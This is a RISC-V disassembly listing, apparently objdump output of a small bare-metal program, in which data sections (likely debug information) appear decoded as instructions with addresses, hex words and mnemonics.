     8da:	0000                	unimp
     8dc:	3c08                	fld	fa0,56(s0)
     8de:	0074                	addi	a3,sp,12
     8e0:	0000                	unimp
     8e2:	5e21                	li	t3,-24
     8e4:	09000003          	lb	zero,144(zero) # 90 <_tbss_end+0xc>
     8e8:	00057e63          	bleu	zero,a0,904 <_tbss_end+0x880>
     8ec:	0800                	addi	s0,sp,16
     8ee:	08c1                	addi	a7,a7,16
     8f0:	0000                	unimp
     8f2:	0900                	addi	s0,sp,144
     8f4:	0000                	unimp
     8f6:	7f22                	ld	t5,40(sp)
     8f8:	0000                	unimp
     8fa:	ff00                	sd	s0,56(a4)
     8fc:	0000013f 0003d123 	0x3d1230000013f
     904:	0100                	addi	s0,sp,128
     906:	ed39                	bnez	a0,964 <_tbss_end+0x8e0>
     908:	0008                	0x8
     90a:	0900                	addi	s0,sp,144
     90c:	002c0003          	lb	zero,2(s8) # 426fc <_tbss_end+0x42678>
     910:	0080                	addi	s0,sp,64
     912:	0000                	unimp
     914:	2300                	fld	fs0,0(a4)
     916:	05f2                	slli	a1,a1,0x1c
     918:	0000                	unimp
     91a:	1102                	slli	sp,sp,0x20
     91c:	000008d7          	0x8d7
     920:	0309                	addi	t1,t1,2
     922:	2be0                	fld	fs0,208(a5)
     924:	8000                	0x8000
     926:	0000                	unimp
     928:	0000                	unimp
     92a:	c108                	sw	a0,0(a0)
     92c:	0008                	0x8
     92e:	3a00                	fld	fs0,48(a2)
     930:	0009                	c.nop	2
     932:	0900                	addi	s0,sp,144
     934:	007f                	0x7f
     936:	0000                	unimp
     938:	1123003f 02000000 	0x20000001123003f
     940:	2a12                	fld	fs4,256(sp)
     942:	0009                	c.nop	2
     944:	0900                	addi	s0,sp,144
     946:	016c0003          	lb	zero,22(s8)
     94a:	0080                	addi	s0,sp,64
     94c:	0000                	unimp
     94e:	0800                	addi	s0,sp,16
     950:	08c1                	addi	a7,a7,16
     952:	0000                	unimp
     954:	095f 0000 7f09      	0x7f090000095f
     95a:	0000                	unimp
     95c:	9f00                	0x9f00
     95e:	2300                	fld	fs0,0(a4)
     960:	037a                	slli	t1,t1,0x1e
     962:	0000                	unimp
     964:	1302                	slli	t1,t1,0x20
     966:	0000094f          	fnmadd.s	fs2,ft0,ft0,ft0,rne
     96a:	0309                	addi	t1,t1,2
     96c:	2b40                	fld	fs0,144(a4)
     96e:	8000                	0x8000
     970:	0000                	unimp
     972:	0000                	unimp
     974:	00030b23          	sb	zero,22(t1) # 274f2 <_tbss_end+0x2746e>
     978:	0200                	addi	s0,sp,256
     97a:	2a14                	fld	fa3,16(a2)
     97c:	0009                	c.nop	2
     97e:	0900                	addi	s0,sp,144
     980:	016c4003          	lbu	zero,22(s8)
     984:	0080                	addi	s0,sp,64
     986:	0000                	unimp
     988:	0800                	addi	s0,sp,16
     98a:	08c1                	addi	a7,a7,16
     98c:	0000                	unimp
     98e:	099a                	slli	s3,s3,0x6
     990:	0000                	unimp
     992:	7f24                	ld	s1,120(a4)
     994:	0000                	unimp
     996:	ff00                	sd	s0,56(a4)
     998:	8123003f 02000003 	0x20000038123003f
     9a0:	8915                	andi	a0,a0,5
     9a2:	0009                	c.nop	2
     9a4:	0900                	addi	s0,sp,144
     9a6:	016c8003          	lb	zero,22(s9)
     9aa:	0080                	addi	s0,sp,64
     9ac:	0000                	unimp
     9ae:	2300                	fld	fs0,0(a4)
     9b0:	0340                	addi	s0,sp,388
     9b2:	0000                	unimp
     9b4:	1602                	slli	a2,a2,0x20
     9b6:	057e                	slli	a0,a0,0x1f
     9b8:	0000                	unimp
     9ba:	0309                	addi	t1,t1,2
     9bc:	2be8                	fld	fa0,208(a5)
     9be:	8000                	0x8000
     9c0:	0000                	unimp
     9c2:	0000                	unimp
     9c4:	fc25                	bnez	s0,93c <_tbss_end+0x8b8>
     9c6:	0005                	c.nop	1
     9c8:	0200                	addi	s0,sp,256
     9ca:	5452                	lw	s0,52(sp)
     9cc:	0000                	unimp
     9ce:	b400                	fsd	fs0,40(s0)
     9d0:	0012                	c.slli	zero,0x4
     9d2:	0080                	addi	s0,sp,64
     9d4:	0000                	unimp
     9d6:	1a00                	addi	s0,sp,304
     9d8:	00000003          	lb	zero,0(zero) # 0 <_tdata_begin>
     9dc:	0000                	unimp
     9de:	0100                	addi	s0,sp,128
     9e0:	ae9c                	fsd	fa5,24(a3)
     9e2:	2600000b          	0x2600000b
     9e6:	0000012b          	0x12b
     9ea:	5302                	lw	t1,32(sp)
     9ec:	000008d7          	0x8d7
     9f0:	9102                	jalr	sp
     9f2:	2668                	fld	fa0,200(a2)
     9f4:	05d1                	addi	a1,a1,20
     9f6:	0000                	unimp
     9f8:	5402                	lw	s0,32(sp)
     9fa:	000008d7          	0x8d7
     9fe:	7f989103          	lh	sp,2041(a7)
     a02:	1226                	slli	tp,tp,0x29
     a04:	0005                	c.nop	1
     a06:	0200                	addi	s0,sp,256
     a08:	d754                	sw	a3,44(a4)
     a0a:	0008                	0x8
     a0c:	0300                	addi	s0,sp,384
     a0e:	8891                	andi	s1,s1,4
     a10:	267f                	0x267f
     a12:	0049                	c.nop	18
     a14:	0000                	unimp
     a16:	5402                	lw	s0,32(sp)
     a18:	000008d7          	0x8d7
     a1c:	7ef89103          	lh	sp,2031(a7)
     a20:	c526                	sw	s1,136(sp)
     a22:	0000                	unimp
     a24:	0200                	addi	s0,sp,256
     a26:	d754                	sw	a3,44(a4)
     a28:	0008                	0x8
     a2a:	0300                	addi	s0,sp,384
     a2c:	8091                	srli	s1,s1,0x4
     a2e:	267f                	0x267f
     a30:	0108                	addi	a0,sp,128
     a32:	0000                	unimp
     a34:	5502                	lw	a0,32(sp)
     a36:	08c1                	addi	a7,a7,16
     a38:	0000                	unimp
     a3a:	9102                	jalr	sp
     a3c:	05e52667          	0x5e52667
     a40:	0000                	unimp
     a42:	5602                	lw	a2,32(sp)
     a44:	0bae                	slli	s7,s7,0xb
     a46:	0000                	unimp
     a48:	0309                	addi	t1,t1,2
     a4a:	ac80                	fsd	fs0,24(s1)
     a4c:	8001                	srli	s0,s0,0x0
     a4e:	0000                	unimp
     a50:	0000                	unimp
     a52:	00130027          	0x130027
     a56:	0080                	addi	s0,sp,64
     a58:	0000                	unimp
     a5a:	c200                	sw	s0,0(a2)
     a5c:	0002                	c.slli	zero,0x0
     a5e:	0000                	unimp
     a60:	0000                	unimp
     a62:	2800                	fld	fs0,16(s0)
     a64:	656c                	ld	a1,200(a0)
     a66:	006e                	c.slli	zero,0x1b
     a68:	6202                	ld	tp,0(sp)
     a6a:	000008d7          	0x8d7
     a6e:	9102                	jalr	sp
     a70:	2758                	fld	fa4,136(a4)
     a72:	1306                	slli	t1,t1,0x21
     a74:	8000                	0x8000
     a76:	0000                	unimp
     a78:	0000                	unimp
     a7a:	02a8                	addi	a0,sp,328
     a7c:	0000                	unimp
     a7e:	0000                	unimp
     a80:	0000                	unimp
     a82:	1326                	slli	t1,t1,0x29
     a84:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     a88:	be96                	fsd	ft5,376(sp)
     a8a:	0300000b          	0x300000b
     a8e:	f091                	bnez	s1,992 <_tbss_end+0x90e>
     a90:	267e                	fld	fa2,472(sp)
     a92:	00ad                	addi	ra,ra,11
     a94:	0000                	unimp
     a96:	9702                	jalr	a4
     a98:	0bce                	slli	s7,s7,0x13
     a9a:	0000                	unimp
     a9c:	7ee09103          	lh	sp,2030(ra)
     aa0:	0629                	addi	a2,a2,10
     aa2:	00800013          	li	zero,8
     aa6:	0000                	unimp
     aa8:	3000                	fld	fs0,32(s0)
     aaa:	0000                	unimp
     aac:	0000                	unimp
     aae:	0000                	unimp
     ab0:	c400                	sw	s0,8(s0)
     ab2:	000a                	c.slli	zero,0x2
     ab4:	2600                	fld	fs0,8(a2)
     ab6:	04ee                	slli	s1,s1,0x1b
     ab8:	0000                	unimp
     aba:	6502                	ld	a0,0(sp)
     abc:	000008d7          	0x8d7
     ac0:	9102                	jalr	sp
     ac2:	0050                	addi	a2,sp,4
     ac4:	00133627          	fsd	ft1,12(t1)
     ac8:	0080                	addi	s0,sp,64
     aca:	0000                	unimp
     acc:	5800                	lw	s0,48(s0)
     ace:	0001                	nop
     ad0:	0000                	unimp
     ad2:	0000                	unimp
     ad4:	2600                	fld	fs0,8(a2)
     ad6:	0019                	c.nop	6
     ad8:	0000                	unimp
     ada:	6a02                	ld	s4,0(sp)
     adc:	000008d7          	0x8d7
     ae0:	9102                	jalr	sp
     ae2:	2948                	fld	fa0,144(a0)
     ae4:	134c                	addi	a1,sp,420
     ae6:	8000                	0x8000
     ae8:	0000                	unimp
     aea:	0000                	unimp
     aec:	0094                	addi	a3,sp,64
     aee:	0000                	unimp
     af0:	0000                	unimp
     af2:	0000                	unimp
     af4:	0b24                	addi	s1,sp,408
     af6:	0000                	unimp
     af8:	6a28                	ld	a0,80(a2)
     afa:	0200                	addi	s0,sp,256
     afc:	0008cc6f          	jal	s8,8cafc <_tbss_end+0x8ca78>
     b00:	0200                	addi	s0,sp,256
     b02:	4091                	li	ra,4
     b04:	0013aa27          	fsw	ft1,20(t2)
     b08:	0080                	addi	s0,sp,64
     b0a:	0000                	unimp
     b0c:	1c00                	addi	s0,sp,560
     b0e:	0000                	unimp
     b10:	0000                	unimp
     b12:	0000                	unimp
     b14:	2800                	fld	fs0,16(s0)
     b16:	7a02006b          	0x7a02006b
     b1a:	000008d7          	0x8d7
     b1e:	7fb89103          	lh	sp,2043(a7)
     b22:	0000                	unimp
     b24:	0013e027          	0x13e027
     b28:	0080                	addi	s0,sp,64
     b2a:	0000                	unimp
     b2c:	9a00                	0x9a00
     b2e:	0000                	unimp
     b30:	0000                	unimp
     b32:	0000                	unimp
     b34:	2800                	fld	fs0,16(s0)
     b36:	0069                	c.nop	26
     b38:	8602                	jr	a2
     b3a:	000008d7          	0x8d7
     b3e:	7fb09103          	lh	sp,2043(ra)
     b42:	0013e627          	0x13e627
     b46:	0080                	addi	s0,sp,64
     b48:	0000                	unimp
     b4a:	7e00                	ld	s0,56(a2)
     b4c:	0000                	unimp
     b4e:	0000                	unimp
     b50:	0000                	unimp
     b52:	2600                	fld	fs0,8(a2)
     b54:	00000393          	li	t2,0
     b58:	8702                	jr	a4
     b5a:	000008d7          	0x8d7
     b5e:	7fa89103          	lh	sp,2042(a7)
     b62:	ea29                	bnez	a2,bb4 <_tbss_end+0xb30>
     b64:	00800013          	li	zero,8
     b68:	0000                	unimp
     b6a:	0c00                	addi	s0,sp,528
     b6c:	0000                	unimp
     b6e:	0000                	unimp
     b70:	0000                	unimp
     b72:	8700                	0x8700
     b74:	2600000b          	0x2600000b
     b78:	01b2                	slli	gp,gp,0xc
     b7a:	0000                	unimp
     b7c:	8802                	jr	a6
     b7e:	007f                	0x7f
     b80:	0000                	unimp
     b82:	7fa09103          	lh	sp,2042(ra)
     b86:	2700                	fld	fs0,8(a4)
     b88:	1418                	addi	a4,sp,544
     b8a:	8000                	0x8000
     b8c:	0000                	unimp
     b8e:	0000                	unimp
     b90:	000c                	0xc
     b92:	0000                	unimp
     b94:	0000                	unimp
     b96:	0000                	unimp
     b98:	b226                	fsd	fs1,288(sp)
     b9a:	0001                	nop
     b9c:	0200                	addi	s0,sp,256
     b9e:	7f8a                	ld	t6,160(sp)
     ba0:	0000                	unimp
     ba2:	0300                	addi	s0,sp,384
     ba4:	9091                	srli	s1,s1,0x24
     ba6:	007f                	0x7f
     ba8:	0000                	unimp
     baa:	0000                	unimp
     bac:	0000                	unimp
     bae:	d708                	sw	a0,40(a4)
     bb0:	0008                	0x8
     bb2:	be00                	fsd	fs0,56(a2)
     bb4:	0900000b          	0x900000b
     bb8:	007f                	0x7f
     bba:	0000                	unimp
     bbc:	00ff                	0xff
     bbe:	c108                	sw	a0,0(a0)
     bc0:	0008                	0x8
     bc2:	ce00                	sw	s0,24(a2)
     bc4:	0900000b          	0x900000b
     bc8:	007f                	0x7f
     bca:	0000                	unimp
     bcc:	0001                	nop
     bce:	d708                	sw	a0,40(a4)
     bd0:	0008                	0x8
     bd2:	de00                	sw	s0,56(a2)
     bd4:	0900000b          	0x900000b
     bd8:	007f                	0x7f
     bda:	0000                	unimp
     bdc:	0001                	nop
     bde:	962a                	add	a2,a2,a0
     be0:	0002                	c.slli	zero,0x0
     be2:	0200                	addi	s0,sp,256
     be4:	023a                	slli	tp,tp,0xe
     be6:	0012                	c.slli	zero,0x4
     be8:	0080                	addi	s0,sp,64
     bea:	0000                	unimp
     bec:	b200                	fsd	fs0,32(a2)
     bee:	0000                	unimp
     bf0:	0000                	unimp
     bf2:	0000                	unimp
     bf4:	0100                	addi	s0,sp,128
     bf6:	389c                	fld	fa5,48(s1)
     bf8:	000c                	0xc
     bfa:	2b00                	fld	fs0,16(a4)
     bfc:	6469                	lui	s0,0x1a
     bfe:	0078                	addi	a4,sp,12
     c00:	3a02                	fld	fs4,32(sp)
     c02:	000008d7          	0x8d7
     c06:	9102                	jalr	sp
     c08:	2658                	fld	fa4,136(a2)
     c0a:	0108                	addi	a0,sp,128
     c0c:	0000                	unimp
     c0e:	3b02                	fld	fs6,32(sp)
     c10:	08c1                	addi	a7,a7,16
     c12:	0000                	unimp
     c14:	9102                	jalr	sp
     c16:	129c276f          	jal	a4,c353e <_tbss_end+0xc34ba>
     c1a:	8000                	0x8000
     c1c:	0000                	unimp
     c1e:	0000                	unimp
     c20:	000c                	0xc
     c22:	0000                	unimp
     c24:	0000                	unimp
     c26:	0000                	unimp
     c28:	b226                	fsd	fs1,288(sp)
     c2a:	0001                	nop
     c2c:	0200                	addi	s0,sp,256
     c2e:	00007f4f          	fnmadd.s	ft10,ft0,ft0,ft0
     c32:	0200                	addi	s0,sp,256
     c34:	6091                	lui	ra,0x4
     c36:	0000                	unimp
     c38:	232a                	fld	ft6,136(sp)
     c3a:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     c3e:	1622                	slli	a2,a2,0x28
     c40:	0011                	c.nop	4
     c42:	0080                	addi	s0,sp,64
     c44:	0000                	unimp
     c46:	ec00                	sd	s0,24(s0)
     c48:	0000                	unimp
     c4a:	0000                	unimp
     c4c:	0000                	unimp
     c4e:	0100                	addi	s0,sp,128
     c50:	ac9c                	fsd	fa5,24(s1)
     c52:	000c                	0xc
     c54:	2c00                	fld	fs0,24(s0)
     c56:	0218                	addi	a4,sp,256
     c58:	0000                	unimp
     c5a:	2202                	fld	ft4,0(sp)
     c5c:	0cac                	addi	a1,sp,600
     c5e:	0000                	unimp
     c60:	9102                	jalr	sp
     c62:	2c58                	fld	fa4,152(s0)
     c64:	01f5                	addi	gp,gp,29
     c66:	0000                	unimp
     c68:	2202                	fld	ft4,0(sp)
     c6a:	000008d7          	0x8d7
     c6e:	9102                	jalr	sp
     c70:	2c50                	fld	fa2,152(s0)
     c72:	000004f3          	0x4f3
     c76:	2202                	fld	ft4,0(sp)
     c78:	0cb2                	slli	s9,s9,0xc
     c7a:	0000                	unimp
     c7c:	9102                	jalr	sp
     c7e:	2c48                	fld	fa0,152(s0)
     c80:	0000015b          	0x15b
     c84:	2202                	fld	ft4,0(sp)
     c86:	0cac                	addi	a1,sp,600
     c88:	0000                	unimp
     c8a:	9102                	jalr	sp
     c8c:	2740                	fld	fs0,136(a4)
     c8e:	113e                	slli	sp,sp,0x2f
     c90:	8000                	0x8000
     c92:	0000                	unimp
     c94:	0000                	unimp
     c96:	00bc                	addi	a5,sp,72
     c98:	0000                	unimp
     c9a:	0000                	unimp
     c9c:	0000                	unimp
     c9e:	6928                	ld	a0,80(a0)
     ca0:	0200                	addi	s0,sp,256
     ca2:	d726                	sw	s1,172(sp)
     ca4:	0008                	0x8
     ca6:	0200                	addi	s0,sp,256
     ca8:	6891                	lui	a7,0x4
     caa:	0000                	unimp
     cac:	08d7080f          	0x8d7080f
     cb0:	0000                	unimp
     cb2:	08c1080f          	0x8c1080f
     cb6:	0000                	unimp
     cb8:	4f2d                	li	t5,11
     cba:	0002                	c.slli	zero,0x0
     cbc:	0100                	addi	s0,sp,128
     cbe:	4846                	lw	a6,80(sp)
     cc0:	0010                	0x10
     cc2:	0080                	addi	s0,sp,64
     cc4:	0000                	unimp
     cc6:	ce00                	sw	s0,24(a2)
     cc8:	0000                	unimp
     cca:	0000                	unimp
     ccc:	0000                	unimp
     cce:	0100                	addi	s0,sp,128
     cd0:	2c9c                	fld	fa5,24(s1)
     cd2:	00000093          	li	ra,0
     cd6:	4601                	li	a2,0
     cd8:	000008d7          	0x8d7
     cdc:	7fa89103          	lh	sp,2042(a7) # 47fa <_tbss_end+0x4776>
     ce0:	007a732b          	0x7a732b
     ce4:	4601                	li	a2,0
     ce6:	000008d7          	0x8d7
     cea:	7fa09103          	lh	sp,2042(ra) # 47fa <_tbss_end+0x4776>
     cee:	b626                	fsd	fs1,296(sp)
     cf0:	01000003          	lb	zero,16(zero) # 10 <_tdata_begin+0x10>
     cf4:	d74c                	sw	a1,44(a4)
     cf6:	0008                	0x8
     cf8:	0200                	addi	s0,sp,256
     cfa:	6891                	lui	a7,0x4
     cfc:	0826                	slli	a6,a6,0x9
     cfe:	0001                	nop
     d00:	0100                	addi	s0,sp,128
     d02:	0008c15b          	0x8c15b
     d06:	0200                	addi	s0,sp,256
     d08:	5791                	li	a5,-28
     d0a:	4d26                	lw	s10,72(sp)
     d0c:	0005                	c.nop	1
     d0e:	0100                	addi	s0,sp,128
     d10:	d761                	beqz	a4,cd8 <_tbss_end+0xc54>
     d12:	0008                	0x8
     d14:	0200                	addi	s0,sp,256
     d16:	4891                	li	a7,4
     d18:	0010a027          	fsw	ft1,0(ra)
     d1c:	0080                	addi	s0,sp,64
     d1e:	0000                	unimp
     d20:	6e00                	ld	s0,24(a2)
     d22:	0000                	unimp
     d24:	0000                	unimp
     d26:	0000                	unimp
     d28:	2800                	fld	fs0,16(s0)
     d2a:	0069                	c.nop	26
     d2c:	6401                	0x6401
     d2e:	000008d7          	0x8d7
     d32:	9102                	jalr	sp
     d34:	2760                	fld	fs0,200(a4)
     d36:	10a6                	slli	ra,ra,0x29
     d38:	8000                	0x8000
     d3a:	0000                	unimp
     d3c:	0000                	unimp
     d3e:	0052                	c.slli	zero,0x14
     d40:	0000                	unimp
     d42:	0000                	unimp
     d44:	0000                	unimp
     d46:	3f26                	fld	ft10,104(sp)
     d48:	0000                	unimp
     d4a:	0100                	addi	s0,sp,128
     d4c:	0008d767          	0x8d767
     d50:	0200                	addi	s0,sp,256
     d52:	4091                	li	ra,4
     d54:	0010bc27          	fsd	ft1,24(ra)
     d58:	0080                	addi	s0,sp,64
     d5a:	0000                	unimp
     d5c:	3c00                	fld	fs0,56(s0)
     d5e:	0000                	unimp
     d60:	0000                	unimp
     d62:	0000                	unimp
     d64:	2800                	fld	fs0,16(s0)
     d66:	006a                	c.slli	zero,0x1a
     d68:	6b01                	0x6b01
     d6a:	000008d7          	0x8d7
     d6e:	9102                	jalr	sp
     d70:	2758                	fld	fa4,136(a4)
     d72:	10c2                	slli	ra,ra,0x30
     d74:	8000                	0x8000
     d76:	0000                	unimp
     d78:	0000                	unimp
     d7a:	0022                	c.slli	zero,0x8
     d7c:	0000                	unimp
     d7e:	0000                	unimp
     d80:	0000                	unimp
     d82:	e426                	sd	s1,8(sp)
     d84:	0000                	unimp
     d86:	0100                	addi	s0,sp,128
     d88:	d76e                	sw	s11,172(sp)
     d8a:	0008                	0x8
     d8c:	0300                	addi	s0,sp,384
     d8e:	b891                	j	5e2 <_tbss_end+0x55e>
     d90:	007f                	0x7f
     d92:	0000                	unimp
     d94:	0000                	unimp
     d96:	2a00                	fld	fs0,16(a2)
     d98:	0000                	unimp
     d9a:	0200                	addi	s0,sp,256
     d9c:	5d00                	lw	s0,56(a0)
     d9e:	0002                	c.slli	zero,0x0
     da0:	0800                	addi	s0,sp,16
     da2:	6001                	0x6001
     da4:	0004                	0x4
     da6:	0000                	unimp
     da8:	0000                	unimp
     daa:	0080                	addi	s0,sp,64
     dac:	0000                	unimp
     dae:	c600                	sw	s0,8(a2)
     db0:	0001                	nop
     db2:	0080                	addi	s0,sp,64
     db4:	0000                	unimp
     db6:	0b00                	addi	s0,sp,400
     db8:	0006                	c.slli	zero,0x1
     dba:	1500                	addi	s0,sp,672
     dbc:	0006                	c.slli	zero,0x1
     dbe:	3e00                	fld	fs0,56(a2)
     dc0:	0006                	c.slli	zero,0x1
     dc2:	0100                	addi	s0,sp,128
     dc4:	2a80                	fld	fs0,16(a3)
     dc6:	0000                	unimp
     dc8:	0200                	addi	s0,sp,256
     dca:	7100                	ld	s0,32(a0)
     dcc:	0002                	c.slli	zero,0x0
     dce:	0800                	addi	s0,sp,16
     dd0:	5801                	li	a6,-32
     dd2:	0008                	0x8
     dd4:	ce00                	sw	s0,24(a2)
     dd6:	0015                	c.nop	5
     dd8:	0080                	addi	s0,sp,64
     dda:	0000                	unimp
     ddc:	fc00                	sd	s0,56(s0)
     dde:	0015                	c.nop	5
     de0:	0080                	addi	s0,sp,64
     de2:	0000                	unimp
     de4:	4a00                	lw	s0,16(a2)
     de6:	0006                	c.slli	zero,0x1
     de8:	1500                	addi	s0,sp,672
     dea:	0006                	c.slli	zero,0x1
     dec:	3e00                	fld	fs0,56(a2)
     dee:	0006                	c.slli	zero,0x1
     df0:	0100                	addi	s0,sp,128
     df2:	c680                	sw	s0,8(a3)
     df4:	04000017          	auipc	zero,0x4000
     df8:	8500                	0x8500
     dfa:	0002                	c.slli	zero,0x0
     dfc:	0800                	addi	s0,sp,16
     dfe:	7301                	lui	t1,0xfffe0
     e00:	0008                	0x8
     e02:	0c00                	addi	s0,sp,528
     e04:	071d                	addi	a4,a4,7
     e06:	0000                	unimp
     e08:	074a                	slli	a4,a4,0x12
     e0a:	0000                	unimp
     e0c:	15fc                	addi	a5,sp,748
     e0e:	8000                	0x8000
     e10:	0000                	unimp
     e12:	0000                	unimp
     e14:	1214                	addi	a3,sp,288
     e16:	0000                	unimp
     e18:	0000                	unimp
     e1a:	0000                	unimp
     e1c:	08e4                	addi	s1,sp,92
     e1e:	0000                	unimp
     e20:	0102                	slli	sp,sp,0x0
     e22:	c506                	sw	ra,136(sp)
     e24:	02000003          	lb	zero,32(zero) # 4000e14 <_tbss_end+0x4000d90>
     e28:	0801                	addi	a6,a6,0
     e2a:	000003c3          	fmadd.s	ft7,ft0,ft0,ft0,rne
     e2e:	0202                	slli	tp,tp,0x0
     e30:	e805                	bnez	s0,e60 <_tbss_end+0xddc>
     e32:	02000003          	lb	zero,32(zero) # 20 <_tdata_begin+0x20>
     e36:	0702                	slli	a4,a4,0x0
     e38:	00000233          	add	tp,zero,zero
     e3c:	69050403          	lb	s0,1680(a0) # 50d56 <_tbss_end+0x50cd2>
     e40:	746e                	ld	s0,248(sp)
     e42:	0400                	addi	s0,sp,512
     e44:	0049                	c.nop	18
     e46:	0000                	unimp
     e48:	5005                	c.li	zero,-31
     e4a:	0000                	unimp
     e4c:	0500                	addi	s0,sp,640
     e4e:	0049                	c.nop	18
     e50:	0000                	unimp
     e52:	0402                	slli	s0,s0,0x0
     e54:	00007d07          	0x7d07
     e58:	0200                	addi	s0,sp,256
     e5a:	0508                	addi	a0,sp,640
     e5c:	000000f3          	0xf3
     e60:	8806                	mv	a6,ra
     e62:	04000003          	lb	zero,64(zero) # 40 <buf.2990>
     e66:	1969                	addi	s2,s2,-6
     e68:	0079                	c.nop	30
     e6a:	0000                	unimp
     e6c:	0802                	slli	a6,a6,0x0
     e6e:	00007807          	0x7807
     e72:	0600                	addi	s0,sp,768
     e74:	0829                	addi	a6,a6,10
     e76:	0000                	unimp
     e78:	e804                	sd	s1,16(s0)
     e7a:	791a                	ld	s2,416(sp)
     e7c:	0000                	unimp
     e7e:	0600                	addi	s0,sp,768
     e80:	038a                	slli	t2,t2,0x2
     e82:	0000                	unimp
     e84:	3c05                	addiw	s8,s8,-31
     e86:	6d14                	ld	a3,24(a0)
     e88:	0000                	unimp
     e8a:	0400                	addi	s0,sp,512
     e8c:	008c                	addi	a1,sp,64
     e8e:	0000                	unimp
     e90:	2b06                	fld	fs6,64(sp)
     e92:	0008                	0x8
     e94:	0500                	addi	s0,sp,640
     e96:	1552                	slli	a0,a0,0x34
     e98:	0080                	addi	s0,sp,64
     e9a:	0000                	unimp
     e9c:	9d05                	subw	a0,a0,s1
     e9e:	0000                	unimp
     ea0:	0600                	addi	s0,sp,768
     ea2:	0582                	slli	a1,a1,0x0
     ea4:	0000                	unimp
     ea6:	d106                	sw	ra,160(sp)
     ea8:	00007917          	auipc	s2,0x7
     eac:	0200                	addi	s0,sp,256
     eae:	0508                	addi	a0,sp,640
     eb0:	00ee                	slli	ra,ra,0x1b
     eb2:	0000                	unimp
     eb4:	1002                	c.slli	zero,0x20
     eb6:	2d04                	fld	fs1,24(a0)
     eb8:	07000003          	lb	zero,112(zero) # 70 <buf.2990+0x30>
     ebc:	0281                	addi	t0,t0,0
     ebe:	0000                	unimp
     ec0:	5e06                	lw	t3,96(sp)
     ec2:	1701                	addi	a4,a4,-32
     ec4:	005f 0000 7306      	0x73060000005f
     eca:	07000003          	lb	zero,112(zero) # 70 <buf.2990+0x30>
     ece:	0e2e                	slli	t3,t3,0xb
     ed0:	0066                	c.slli	zero,0x19
     ed2:	0000                	unimp
     ed4:	d306                	sw	ra,164(sp)
     ed6:	0004                	0x4
     ed8:	0700                	addi	s0,sp,896
     eda:	0e74                	addi	a3,sp,796
     edc:	0066                	c.slli	zero,0x19
     ede:	0000                	unimp
     ee0:	8006                	c.mv	zero,ra
     ee2:	0005                	c.nop	1
     ee4:	0700                	addi	s0,sp,896
     ee6:	00661793          	slli	a5,a2,0x6
     eea:	0000                	unimp
     eec:	0408                	addi	a0,sp,512
     eee:	1b03a507          	flw	fa0,432(t2)
     ef2:	0001                	nop
     ef4:	0900                	addi	s0,sp,144
     ef6:	0000027b          	0x27b
     efa:	c80ca707          	flw	fa4,-896(s9)
     efe:	0000                	unimp
     f00:	0900                	addi	s0,sp,144
     f02:	0201                	addi	tp,tp,0
     f04:	0000                	unimp
     f06:	1b13a807          	flw	fa6,433(t2)
     f0a:	0001                	nop
     f0c:	0000                	unimp
     f0e:	340a                	fld	fs0,160(sp)
     f10:	0000                	unimp
     f12:	2b00                	fld	fs0,16(a4)
     f14:	0001                	nop
     f16:	0b00                	addi	s0,sp,400
     f18:	0079                	c.nop	30
     f1a:	0000                	unimp
     f1c:	080c0003          	lb	zero,128(s8)
     f20:	4f09a207          	flw	ft4,1264(s3)
     f24:	0001                	nop
     f26:	0d00                	addi	s0,sp,656
     f28:	048e                	slli	s1,s1,0x3
     f2a:	0000                	unimp
     f2c:	4907a407          	flw	fs0,1168(a5)
     f30:	0000                	unimp
     f32:	0000                	unimp
     f34:	960d                	srai	a2,a2,0x23
     f36:	0004                	0x4
     f38:	0700                	addi	s0,sp,896
     f3a:	05a9                	addi	a1,a1,10
     f3c:	00f9                	addi	ra,ra,30
     f3e:	0000                	unimp
     f40:	0004                	0x4
     f42:	1006                	c.slli	zero,0x21
     f44:	0004                	0x4
     f46:	0700                	addi	s0,sp,896
     f48:	03aa                	slli	t2,t2,0xa
     f4a:	0000012b          	0x12b
     f4e:	080e                	slli	a6,a6,0x3
     f50:	0948080f          	0x948080f
     f54:	0000                	unimp
     f56:	2506                	fld	fa0,64(sp)
     f58:	0005                	c.nop	1
     f5a:	0800                	addi	s0,sp,16
     f5c:	1919                	addi	s2,s2,-26
     f5e:	005f 0000 a406      	0xa4060000005f
     f64:	09000003          	lb	zero,144(zero) # 90 <_tbss_end+0xc>
     f68:	0d0c                	addi	a1,sp,656
     f6a:	0049                	c.nop	18
     f6c:	0000                	unimp
     f6e:	b806                	fsd	ft1,48(sp)
     f70:	0001                	nop
     f72:	0800                	addi	s0,sp,16
     f74:	016f1b23          	sh	s6,22(t5) # fffffffffffe2016 <_end+0xffffffff7ffc6b56>
     f78:	0000                	unimp
     f7a:	c910                	sw	a2,16(a0)
     f7c:	0001                	nop
     f7e:	2000                	fld	fs0,0(s0)
     f80:	3408                	fld	fa0,40(s0)
     f82:	e108                	sd	a0,0(a0)
     f84:	0001                	nop
     f86:	0d00                	addi	s0,sp,656
     f88:	0431                	addi	s0,s0,12
     f8a:	0000                	unimp
     f8c:	3608                	fld	fa0,40(a2)
     f8e:	0001e113          	ori	sp,gp,0
     f92:	0000                	unimp
     f94:	5f11                	li	t5,-28
     f96:	3708006b          	0x3708006b
     f9a:	00004907          	flq	fs2,0(zero) # 0 <_tdata_begin>
     f9e:	0800                	addi	s0,sp,16
     fa0:	790d                	lui	s2,0xfffe3
     fa2:	0004                	0x4
     fa4:	0800                	addi	s0,sp,16
     fa6:	00490b37          	lui	s6,0x490
     faa:	0000                	unimp
     fac:	0d0c                	addi	a1,sp,656
     fae:	01ac                	addi	a1,sp,200
     fb0:	0000                	unimp
     fb2:	3708                	fld	fa0,40(a4)
     fb4:	4914                	lw	a3,16(a0)
     fb6:	0000                	unimp
     fb8:	1000                	addi	s0,sp,32
     fba:	6b0d                	lui	s6,0x3
     fbc:	0005                	c.nop	1
     fbe:	0800                	addi	s0,sp,16
     fc0:	00491b37          	lui	s6,0x491
     fc4:	0000                	unimp
     fc6:	1114                	addi	a3,sp,160
     fc8:	785f 0800 0b38      	0xb380800785f
     fce:	000001e7          	jalr	gp,zero
     fd2:	0018                	0x18
     fd4:	0812                	slli	a6,a6,0x4
     fd6:	00000187          	0x187
     fda:	630a                	ld	t1,128(sp)
     fdc:	0001                	nop
     fde:	f700                	sd	s0,40(a4)
     fe0:	0001                	nop
     fe2:	0b00                	addi	s0,sp,400
     fe4:	0079                	c.nop	30
     fe6:	0000                	unimp
     fe8:	0000                	unimp
